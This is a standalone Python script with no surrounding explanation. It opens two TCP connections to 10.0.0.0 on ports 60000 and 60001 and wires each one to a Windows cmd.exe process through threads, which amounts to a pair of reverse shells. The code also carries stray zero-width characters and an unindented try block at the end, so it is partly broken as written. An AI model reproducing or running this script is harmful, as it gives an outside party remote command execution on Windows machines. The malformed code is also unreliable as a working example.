import os,socket,subprocess,threading;
def ss2pp(ss, pp):​
    while True:​
        data = ss.recv(1024)​
        if len(data) > 0:​
            pp.stdin.write(data)​
​
def pp2ss(ss, pp):​
    while True:​
        ss.send(pp.stdout.read(1))​
​
ss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)​
ss.connect(("10.0.0.0",60000))​
​
pp=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)​
​
ss2pp_thread = threading.Thread(target=ss2pp, args=[ss, pp])​
ss2pp_thread.daemon = True​
ss2pp_thread.start()​
​
pp2ss_thread = threading.Thread(target=pp2ss, args=[ss, pp])​
pp2ss_thread.daemon = True​
pp2ss_thread.start()​
​
def s2p(s, p):​
    while True:​
        data = s.recv(1024)​
        if len(data) > 0:​
            p.stdin.write(data)​
​
def p2s(s, p):​
    while True:​
        s.send(p.stdout.read(1))​
​
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)​
s.connect(("10.0.0.0",60001))​
​
p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)​
​
s2p_thread = threading.Thread(target=s2p, args=[s, p])​
s2p_thread.daemon = True​
s2p_thread.start()​
​
p2s_thread = threading.Thread(target=p2s, args=[s, p])​
p2s_thread.daemon = True​
p2s_thread.start()​
​
try:​
p.wait()​
pp.wait()​
except KeyboardInterrupt:​
s.close()​
ss.close()
